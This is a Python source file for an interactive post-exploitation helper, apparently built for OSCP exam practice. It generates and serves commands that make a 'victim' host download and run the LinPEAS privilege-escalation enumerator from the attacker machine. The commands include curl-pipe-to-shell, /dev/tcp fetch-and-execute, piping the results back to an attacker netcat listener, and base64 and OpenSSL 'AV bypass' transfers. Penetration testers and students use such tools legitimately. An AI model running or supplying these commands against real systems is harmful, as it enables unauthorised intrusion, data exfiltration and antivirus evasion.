#!/usr/bin/env python3
"""
LinPEAS Helper - Post-Exploitation Privilege Escalation Enumeration
Simplifies LinPEAS execution with multiple transfer methods and AV bypass options
"""

import argparse
import subprocess
import sys
import os
import base64
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from themes import Colors
from config import ConfigManager


class LinPEASHelper:
    """Interactive LinPEAS execution helper"""

    def __init__(self):
        self.config = ConfigManager()
        self.script_dir = Path(__file__).parent.parent / 'dependencies'
        self.linpeas_sh = self.script_dir / 'linpeas.sh'
        self.linpeas_bin = self.script_dir / 'linpeas_linux_amd64'
        self.upc_script = self.script_dir / 'unix-privesc-check'

        # Verify files exist
        if not self.linpeas_sh.exists():
            print(f"{Colors.RED}✗ Error:{Colors.END} linpeas.sh not found at {self.linpeas_sh}")
            print(f"  Run: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o {self.linpeas_sh}")
            sys.exit(1)

        if not self.linpeas_bin.exists():
            print(f"{Colors.YELLOW}⚠ Warning:{Colors.END} linpeas_linux_amd64 not found at {self.linpeas_bin}")
            print(f"  Binary methods will be unavailable")

        if not self.upc_script.exists():
            print(f"{Colors.YELLOW}ℹ Info:{Colors.END} unix-privesc-check not found (Method 8 unavailable)")
            print(f"  Download: curl -L https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check -o {self.upc_script}")

    def print_banner(self):
        """Display tool banner"""
        banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
║  CRACK LinPEAS Helper - Privilege Escalation Enumeration      ║
║  Post-Exploitation Automation                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(banner)

    def load_config_values(self):
        """Load configuration values with defaults"""
        return {
            'LHOST': self.config.get_variable('LHOST') or self._detect_ip(),
            'HTTP_PORT': self.config.get_variable('LPORT') or '8000',
            'LISTEN_PORT': '9002',
            'OUTPUT_FILE': '/dev/shm/linpeas.txt',
            'TARGET': self.config.get_variable('TARGET') or '192.168.45.100',
            'ENCRYPTION_PASS': 'AVBypassWithAES'
        }

    def _detect_ip(self):
        """Detect local IP from tun0 interface"""
        try:
            result = subprocess.run(['ip', 'addr', 'show', 'tun0'],
                                  capture_output=True, text=True, timeout=2)
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    return line.strip().split()[1].split('/')[0]
        except:
            pass
        return '10.10.14.5'

    def _find_available_port(self, preferred_port):
        """Find available port, fallback if preferred is busy"""
        import socket

        # Try preferred port first
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', int(preferred_port)))
            sock.close()
            return int(preferred_port)
        except OSError:
            # Port is busy, find alternative
            print(f"{Colors.YELLOW}⚠ Port {preferred_port} is in use{Colors.END}")

            # Try common alternatives
            alternatives = [8000, 8080, 8888, 9000, 9999]
            for port in alternatives:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.bind(('0.0.0.0', port))
                    sock.close()
                    print(f"{Colors.GREEN}✓ Using available port {port} instead{Colors.END}")
                    return port
                except OSError:
                    continue

            # If all common ports busy, let OS assign
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', 0))
            port = sock.getsockname()[1]
            sock.close()
            print(f"{Colors.GREEN}✓ Using OS-assigned port {port}{Colors.END}")
            return port

    def select_method(self):
        """Interactive method selection"""
        print(f"\n{Colors.YELLOW}Select Execution Method:{Colors.END}\n")
        methods = [
            ("Direct from GitHub", "Victim downloads from public internet (requires victim internet access)"),
            ("HTTP Server", "Host linpeas locally, victim downloads via curl/wget"),
            ("Netcat Transfer", "Transfer via nc (no curl required on victim)"),
            ("Memory Execution + Output Capture", "Execute in memory, pipe output back to host"),
            ("Binary Execution", "Transfer static binary instead of shell script"),
            ("Base64 Encoded", "AV bypass - base64 encoded transfer"),
            ("OpenSSL Encrypted", "AV bypass - encrypted transfer with openssl"),
            ("unix-privesc-check (Simple)", "Simpler privesc checker via netcat")
        ]

        for i, (name, desc) in enumerate(methods, 1):
            print(f"  {Colors.GREEN}{i}.{Colors.END} {Colors.CYAN}{name}{Colors.END}")
            print(f"     {Colors.BRIGHT_BLACK}{desc}{Colors.END}")

        while True:
            try:
                choice = input(f"\n{Colors.YELLOW}Choice [2]:{Colors.END} ").strip()
                if not choice:
                    return 2
                choice_num = int(choice)
                if 1 <= choice_num <= 8:
                    return choice_num
                print(f"{Colors.RED}Invalid choice. Enter 1-8.{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}Invalid input. Enter a number.{Colors.END}")

    def review_config(self, config):
        """Review and edit configuration"""
        print(f"\n{Colors.CYAN}Current Configuration:{Colors.END}")
        print(f"  LHOST:          {Colors.GREEN}{config['LHOST']}{Colors.END} " +
              ("✓ (auto-detected)" if self.config.get_variable('LHOST') else "(detected)"))
        print(f"  HTTP_PORT:      {Colors.GREEN}{config['HTTP_PORT']}{Colors.END}")
        print(f"  LISTEN_PORT:    {Colors.GREEN}{config['LISTEN_PORT']}{Colors.END} (for output capture)")
        print(f"  OUTPUT_FILE:    {Colors.GREEN}{config['OUTPUT_FILE']}{Colors.END} (victim)")
        print(f"  TARGET:         {Colors.GREEN}{config['TARGET']}{Colors.END} " +
              ("✓ (from config)" if self.config.get_variable('TARGET') else ""))

        edit = input(f"\n{Colors.YELLOW}Edit values? (y/n) [n]:{Colors.END} ").strip().lower()

        if edit == 'y':
            for key in ['LHOST', 'HTTP_PORT', 'LISTEN_PORT', 'OUTPUT_FILE', 'TARGET']:
                new_value = input(f"  {key} [{config[key]}]: ").strip()
                if new_value:
                    config[key] = new_value

        return config

    def explain_flags(self, command, explanations):
        """Display command with flag explanations"""
        print(f"\n{Colors.CYAN}Command:{Colors.END} {command}\n")
        print(f"{Colors.YELLOW}Flag Explanations:{Colors.END}")
        for flag, explanation in explanations.items():
            print(f"  {Colors.GREEN}{flag:20}{Colors.END} {explanation}")

    def method_direct_github(self, config):
        """Method 1: Direct execution from GitHub"""
        print(f"\n{Colors.CYAN}═══ Method 1: Direct from GitHub ═══{Colors.END}\n")

        command = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"

        self.explain_flags(command, {
            'curl': 'Transfer data from URL',
            '-L': 'Follow redirects (GitHub releases redirect)',
            '|': 'Pipe downloaded content to next command',
            'sh': 'Execute shell script from stdin'
        })

        print(f"\n{Colors.YELLOW}Purpose:{Colors.END} Download and execute LinPEAS directly from GitHub")
        print(f"{Colors.YELLOW}Requirements:{Colors.END} Victim must have internet access")
        print(f"{Colors.YELLOW}Exam Tip:{Colors.END} Fast (~2-5 min), but exam VMs may not have internet")

        print(f"\n{Colors.GREEN}[VICTIM] Copy and paste this command:{Colors.END}")
        print(f"{Colors.BOLD}{command}{Colors.END}")

        print(f"\n{Colors.YELLOW}To save output to file:{Colors.END}")
        print(f"{command} > {config['OUTPUT_FILE']}")

        print(f"\n{Colors.YELLOW}To view with colors:{Colors.END}")
        print(f"less -r {config['OUTPUT_FILE']}")

    def method_http_server(self, config):
        """Method 2: HTTP server"""
        print(f"\n{Colors.CYAN}═══ Method 2: HTTP Server ═══{Colors.END}\n")

        host_cmd = f"sudo python3 -m http.server {config['HTTP_PORT']}"
        victim_cmd = f"curl {config['LHOST']}:{config['HTTP_PORT']}/linpeas.sh | sh"

        print(f"{Colors.YELLOW}[HOST] Terminal 1 - Start HTTP Server:{Colors.END}")
        self.explain_flags(host_cmd, {
            'sudo': 'Run as root (required for ports < 1024)',
            'python3 -m': 'Run Python module as script',
            'http.server': 'Built-in HTTP server module',
            config['HTTP_PORT']: 'Port to bind server'
        })

        print(f"\n{Colors.YELLOW}[VICTIM] Copy this command:{Colors.END}")
        self.explain_flags(victim_cmd, {
            'curl': 'Download file from URL',
            config['LHOST']: 'Your attack machine IP',
            '|': 'Pipe downloaded content to shell',
            'sh': 'Execute script from stdin'
        })

        print(f"\n{Colors.YELLOW}Save output to file on victim:{Colors.END}")
        print(f"{victim_cmd} > {config['OUTPUT_FILE']}")

        print(f"\n{Colors.YELLOW}Expected Output:{Colors.END} Colorized privilege escalation vectors")
        print(f"{Colors.YELLOW}Exam Tip:{Colors.END} Most reliable method (~3-5 min execution)")

        print(f"\n{Colors.BOLD}{Colors.CYAN}═══ Commands to Execute ═══{Colors.END}")
        print(f"\n{Colors.YELLOW}[HOST] Terminal 1:{Colors.END}")
        print(f"  cd {self.script_dir}")
        print(f"  {host_cmd}")

        print(f"\n{Colors.YELLOW}[VICTIM] Execute:{Colors.END}")
        print(f"  {victim_cmd}")

        print(f"\n{Colors.BRIGHT_BLACK}# Or save to file:{Colors.END}")
        print(f"  {victim_cmd} > {config['OUTPUT_FILE']}")

    def method_netcat_transfer(self, config):
        """Method 3: Netcat transfer"""
        print(f"\n{Colors.CYAN}═══ Method 3: Netcat Transfer (No Curl) ═══{Colors.END}\n")

        host_cmd = f"sudo nc -q 5 -lvnp {config['HTTP_PORT']} < {self.linpeas_sh}"
        victim_cmd = f"cat < /dev/tcp/{config['LHOST']}/{config['HTTP_PORT']} | sh"

        print(f"{Colors.YELLOW}[HOST] Terminal 1 - Start Netcat Listener:{Colors.END}")
        self.explain_flags(host_cmd, {
            'nc': 'Netcat - TCP/UDP utility',
            '-q 5': 'Quit 5 seconds after EOF',
            '-l': 'Listen mode (wait for connections)',
            '-v': 'Verbose output',
            '-n': 'No DNS resolution (faster)',
            '-p': 'Port to listen on',
            '<': 'Redirect file content to nc stdin'
        })

        print(f"\n{Colors.YELLOW}[VICTIM] Execute this command:{Colors.END}")
        self.explain_flags(victim_cmd, {
            'cat': 'Concatenate and print',
            '/dev/tcp/...': 'Bash built-in TCP connection',
            '|': 'Pipe received data to shell',
            'sh': 'Execute as shell script'
        })

        print(f"\n{Colors.YELLOW}Purpose:{Colors.END} Transfer without curl/wget")
        print(f"{Colors.YELLOW}Requirements:{Colors.END} Bash with /dev/tcp support")
        print(f"{Colors.YELLOW}Exam Tip:{Colors.END} Useful when curl/wget unavailable (~3-5 min)")

        start = input(f"\n{Colors.GREEN}Start netcat listener now? (y/n) [y]:{Colors.END} ").strip().lower()

        if start != 'n':
            print(f"\n{Colors.GREEN}Starting netcat listener on port {config['HTTP_PORT']}...{Colors.END}")
            print(f"{Colors.YELLOW}Waiting for victim connection...{Colors.END}\n")

            try:
                subprocess.run(['sudo', 'nc', '-q', '5', '-lvnp', config['HTTP_PORT']],
                             stdin=open(self.linpeas_sh, 'r'))
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}Listener stopped{Colors.END}")

    def method_memory_execution(self, config):
        """Method 4: Memory execution with output capture"""
        print(f"\n{Colors.CYAN}═══ Method 4: Memory Execution + Output Capture ═══{Colors.END}\n")

        host_http = f"sudo python3 -m http.server {config['HTTP_PORT']}"
        host_listener = f"nc -lvnp {config['LISTEN_PORT']} | tee linpeas.out"
        victim_cmd = f"curl {config['LHOST']}:{config['HTTP_PORT']}/linpeas.sh | sh | nc {config['LHOST']} {config['LISTEN_PORT']}"

        print(f"{Colors.YELLOW}[HOST] Terminal 1 - HTTP Server:{Colors.END}")
        print(f"{Colors.BOLD}{host_http}{Colors.END}")

        print(f"\n{Colors.YELLOW}[HOST] Terminal 2 - Output Listener:{Colors.END}")
        self.explain_flags(host_listener, {
            'nc': 'Netcat listener',
            '-lvnp': 'Listen, verbose, no DNS, port',
            '|': 'Pipe received data',
            'tee': 'Write to file AND stdout',
            'linpeas.out': 'Output file (in current directory)'
        })

        print(f"\n{Colors.YELLOW}[VICTIM] Execute this command:{Colors.END}")
        self.explain_flags(victim_cmd, {
            'curl | sh': 'Download and execute LinPEAS',
            '| nc': 'Pipe output back to attacker',
            config['LISTEN_PORT']: 'Port for output capture'
        })

        print(f"\n{Colors.YELLOW}Purpose:{Colors.END} Execute in RAM, never touch disk, capture output on host")
        print(f"{Colors.YELLOW}Exam Tip:{Colors.END} Stealthiest method (~5-7 min with transfer)")

        print(f"\n{Colors.GREEN}Setup Instructions:{Colors.END}")
        print(f"  1. Start HTTP server (Terminal 1)")
        print(f"  2. Start output listener (Terminal 2)")
        print(f"  3. Execute victim command")
        print(f"  4. Results saved to ./linpeas.out on host")

    def method_binary_execution(self, config):
        """Method 5: Binary execution"""
        if not self.linpeas_bin.exists():
            print(f"{Colors.RED}✗ Error:{Colors.END} Binary not found at {self.linpeas_bin}")
            print(f"  Download: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o {self.linpeas_bin}")
            return

        print(f"\n{Colors.CYAN}═══ Method 5: Binary Execution ═══{Colors.END}\n")

        host_cmd = f"sudo python3 -m http.server {config['HTTP_PORT']}"
        victim_download = f"wget {config['LHOST']}:{config['HTTP_PORT']}/linpeas_linux_amd64 -O /tmp/linpeas"
        victim_exec = "chmod +x /tmp/linpeas && /tmp/linpeas"

        print(f"{Colors.YELLOW}[HOST] Start HTTP Server:{Colors.END}")
        print(f"{Colors.BOLD}{host_cmd}{Colors.END}")

        print(f"\n{Colors.YELLOW}[VICTIM] Download Binary:{Colors.END}")
        self.explain_flags(victim_download, {
            'wget': 'Download files from web',
            '-O': 'Output file name',
            '/tmp/linpeas': 'Destination path'
        })

        print(f"\n{Colors.YELLOW}[VICTIM] Execute Binary:{Colors.END}")
        self.explain_flags(victim_exec, {
            'chmod +x': 'Make file executable',
            '&&': 'Execute next command if first succeeds',
            '/tmp/linpeas': 'Run the binary'
        })

        print(f"\n{Colors.YELLOW}Purpose:{Colors.END} Static binary (no dependencies required)")
        print(f"{Colors.YELLOW}Binary Size:{Colors.END} {self.linpeas_bin.stat().st_size / 1024 / 1024:.1f} MB")
        print(f"{Colors.YELLOW}Exam Tip:{Colors.END} Use when shell script fails (~3-5 min)")

        start = input(f"\n{Colors.GREEN}Start HTTP server now? (y/n) [y]:{Colors.END} ").strip().lower()

        if start != 'n':
            print(f"\n{Colors.GREEN}Starting HTTP server on port {config['HTTP_PORT']}...{Colors.END}")
            print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}\n")

            try:
                subprocess.run(['sudo', 'python3', '-m', 'http.server', config['HTTP_PORT']],
                             cwd=str(self.script_dir))
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}Server stopped{Colors.END}")

    def method_base64_encoded(self, config):
        """Method 6: Base64 encoded transfer"""
        print(f"\n{Colors.CYAN}═══ Method 6: Base64 Encoded (AV Bypass) ═══{Colors.END}\n")

        # Create encoded version
        encoded_file = self.script_dir / 'linpeas.enc'

        print(f"{Colors.YELLOW}Creating base64 encoded version...{Colors.END}")
        with open(self.linpeas_sh, 'rb') as f:
            encoded_content = base64.b64encode(f.read())

        with open(encoded_file, 'wb') as f:
            f.write(encoded_content)

        original_size = self.linpeas_sh.stat().st_size / 1024
        encoded_size = encoded_file.stat().st_size / 1024

        print(f"{Colors.GREEN}✓ Encoded file created:{Colors.END} {encoded_file}")
        print(f"  Original size: {original_size:.1f} KB")
        print(f"  Encoded size:  {encoded_size:.1f} KB ({encoded_size/original_size:.1f}x larger)")

        host_cmd = f"sudo python3 -m http.server {config['HTTP_PORT']}"
        victim_cmd = f"curl {config['LHOST']}:{config['HTTP_PORT']}/linpeas.enc | base64 -d | sh"

        print(f"\n{Colors.YELLOW}[HOST] Start HTTP Server:{Colors.END}")
        print(f"{Colors.BOLD}{host_cmd}{Colors.END}")

        print(f"\n{Colors.YELLOW}[VICTIM] Download and Decode:{Colors.END}")
        self.explain_flags(victim_cmd, {
            'curl': 'Download encoded file',
            'base64 -d': 'Decode from base64',
            '|': 'Pipe decoded content',
            'sh': 'Execute decoded script'
        })

        print(f"\n{Colors.YELLOW}Purpose:{Colors.END} Bypass basic AV signature detection")
        print(f"{Colors.YELLOW}Exam Tip:{Colors.END} Use if direct execution blocked (~3-5 min)")

        start = input(f"\n{Colors.GREEN}Start HTTP server now? (y/n) [y]:{Colors.END} ").strip().lower()

        if start != 'n':
            print(f"\n{Colors.GREEN}Starting HTTP server on port {config['HTTP_PORT']}...{Colors.END}")
            print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}\n")

            try:
                subprocess.run(['sudo', 'python3', '-m', 'http.server', config['HTTP_PORT']],
                             cwd=str(self.script_dir))
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}Server stopped{Colors.END}")

    def method_openssl_encrypted(self, config):
        """Method 7: OpenSSL encrypted transfer"""
        print(f"\n{Colors.CYAN}═══ Method 7: OpenSSL Encrypted (AV Bypass) ═══{Colors.END}\n")

        # Create encrypted version
        encrypted_file = self.script_dir / 'linpeas_encrypted.enc'
        password = config['ENCRYPTION_PASS']

        print(f"{Colors.YELLOW}Creating OpenSSL encrypted version...{Colors.END}")
        result = subprocess.run([
            'openssl', 'enc', '-aes-256-cbc', '-pbkdf2', '-salt',
            '-pass', f'pass:{password}',
            '-in', str(self.linpeas_sh),
            '-out', str(encrypted_file)
        ], capture_output=True)

        if result.returncode != 0:
            print(f"{Colors.RED}✗ Encryption failed:{Colors.END} {result.stderr.decode()}")
            return

        original_size = self.linpeas_sh.stat().st_size / 1024
        encrypted_size = encrypted_file.stat().st_size / 1024

        print(f"{Colors.GREEN}✓ Encrypted file created:{Colors.END} {encrypted_file}")
        print(f"  Original size:  {original_size:.1f} KB")
        print(f"  Encrypted size: {encrypted_size:.1f} KB")
        print(f"  Password:       {Colors.YELLOW}{password}{Colors.END}")

        host_cmd = f"sudo python3 -m http.server {config['HTTP_PORT']}"
        victim_cmd = f"curl {config['LHOST']}:{config['HTTP_PORT']}/linpeas_encrypted.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:{password} | sh"

        print(f"\n{Colors.YELLOW}[HOST] Start HTTP Server:{Colors.END}")
        print(f"{Colors.BOLD}{host_cmd}{Colors.END}")

        print(f"\n{Colors.YELLOW}[VICTIM] Download and Decrypt:{Colors.END}")
        self.explain_flags(victim_cmd, {
            'openssl enc': 'OpenSSL encryption/decryption',
            '-aes-256-cbc': 'AES 256-bit encryption in CBC mode',
            '-pbkdf2': 'Password-Based Key Derivation Function 2',
            '-d': 'Decrypt mode',
            '-pass pass:': 'Password for decryption',
            '| sh': 'Execute decrypted script'
        })

        print(f"\n{Colors.YELLOW}Purpose:{Colors.END} Strong encryption to bypass AV")
        print(f"{Colors.YELLOW}Exam Tip:{Colors.END} Most stealthy transfer method (~3-5 min)")

        start = input(f"\n{Colors.GREEN}Start HTTP server now? (y/n) [y]:{Colors.END} ").strip().lower()

        if start != 'n':
            print(f"\n{Colors.GREEN}Starting HTTP server on port {config['HTTP_PORT']}...{Colors.END}")
            print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}\n")

            try:
                subprocess.run(['sudo', 'python3', '-m', 'http.server', config['HTTP_PORT']],
                             cwd=str(self.script_dir))
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}Server stopped{Colors.END}")

    def method_unix_privesc_check(self, config):
        """Method 8: unix-privesc-check via netcat"""
        print(f"\n{Colors.CYAN}═══ Method 8: unix-privesc-check (Simple) ═══{Colors.END}\n")

        # Check if script exists
        if not self.upc_script.exists():
            print(f"{Colors.RED}✗ Error:{Colors.END} unix-privesc-check not found")
            print(f"\n{Colors.YELLOW}Download it:{Colors.END}")
            print(f"  curl -L https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check -o {self.upc_script}")
            print(f"  chmod +x {self.upc_script}")
            return

        print(f"{Colors.YELLOW}About:{Colors.END} Simpler alternative to LinPEAS")
        print(f"  • Quick checks: SUID, sudo, cron, writable files")
        print(f"  • Less overwhelming output")
        print(f"  • ~1-2 minute execution")

        # Find available port
        preferred_port = int(config['HTTP_PORT'])
        available_port = self._find_available_port(preferred_port)

        # Update commands with actual port
        host_cmd = f"sudo nc -q 5 -lvnp {available_port} < {self.upc_script}"
        victim_cmd_standard = f"cat < /dev/tcp/{config['LHOST']}/{available_port} | sh -s -- standard"
        victim_cmd_detailed = f"cat < /dev/tcp/{config['LHOST']}/{available_port} | sh -s -- detailed"

        print(f"\n{Colors.YELLOW}[HOST] Starting netcat listener on port {available_port}...{Colors.END}")
        self.explain_flags(host_cmd, {
            'nc': 'Netcat - TCP/UDP utility',
            '-q 5': 'Quit 5 seconds after EOF',
            '-l': 'Listen mode',
            '-v': 'Verbose output',
            '-n': 'No DNS resolution',
            '-p': f'Port {available_port}',
            '<': 'Redirect script to netcat stdin'
        })

        print(f"\n{Colors.BOLD}{Colors.GREEN}[VICTIM] Run one of these commands:{Colors.END}\n")

        print(f"{Colors.YELLOW}Standard Mode (recommended):{Colors.END}")
        print(f"  {Colors.BOLD}{victim_cmd_standard}{Colors.END}")

        print(f"\n{Colors.YELLOW}Detailed Mode (verbose):{Colors.END}")
        print(f"  {Colors.BOLD}{victim_cmd_detailed}{Colors.END}")

        print(f"\n{Colors.BRIGHT_BLACK}# Save output to file:{Colors.END}")
        print(f"  {victim_cmd_standard} > /tmp/upc.txt")

        print(f"\n{Colors.YELLOW}Exam Tip:{Colors.END} Use after LinPEAS for quick verification")

        # Start listener
        start = input(f"\n{Colors.GREEN}Start netcat listener now? (y/n) [y]:{Colors.END} ").strip().lower()

        if start != 'n':
            print(f"\n{Colors.GREEN}Starting listener on port {available_port}...{Colors.END}")
            print(f"{Colors.YELLOW}Waiting for victim connection...{Colors.END}\n")

            try:
                subprocess.run(['sudo', 'nc', '-q', '5', '-lvnp', str(available_port)],
                             stdin=open(self.upc_script, 'r'))
                print(f"\n{Colors.GREEN}Transfer complete{Colors.END}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Listener stopped{Colors.END}")

    def run(self):
        """Main execution flow"""
        self.print_banner()

        # Load configuration
        config = self.load_config_values()

        # Select method
        method = self.select_method()

        # Review configuration
        config = self.review_config(config)

        # Execute selected method
        methods = {
            1: self.method_direct_github,
            2: self.method_http_server,
            3: self.method_netcat_transfer,
            4: self.method_memory_execution,
            5: self.method_binary_execution,
            6: self.method_base64_encoded,
            7: self.method_openssl_encrypted,
            8: self.method_unix_privesc_check
        }

        methods[method](config)

        print(f"\n{Colors.GREEN}═══════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.YELLOW}Next Steps:{Colors.END}")
        print(f"  1. Review LinPEAS output for privilege escalation vectors")
        print(f"  2. Focus on: SUID binaries, sudo privileges, cron jobs, writable files")
        print(f"  3. Document findings in CRACK Track")
        print(f"{Colors.GREEN}═══════════════════════════════════════════════════{Colors.END}\n")


def main():
    """Entry point"""
    parser = argparse.ArgumentParser(
        description='LinPEAS Helper - Privilege Escalation Enumeration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  crack linpeas                    # Interactive wizard

Methods Available:
  1. Direct from GitHub            # Fast, requires victim internet
  2. HTTP Server (recommended)     # Most reliable
  3. Netcat Transfer              # No curl required
  4. Memory Execution             # Stealthiest
  5. Binary Execution             # No dependencies
  6. Base64 Encoded               # AV bypass
  7. OpenSSL Encrypted            # Strong AV bypass
  8. unix-privesc-check (Simple)  # Simpler alternative checker

Exam Tips:
  - Method 2 (HTTP Server) most reliable for OSCP
  - Execution time: 2-5 minutes typically
  - Save output to /dev/shm (RAM-based, no disk writes)
  - Use 'less -r' to view colorized output
        """
    )

    try:
        helper = LinPEASHelper()
        helper.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}✗ Error:{Colors.END} {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
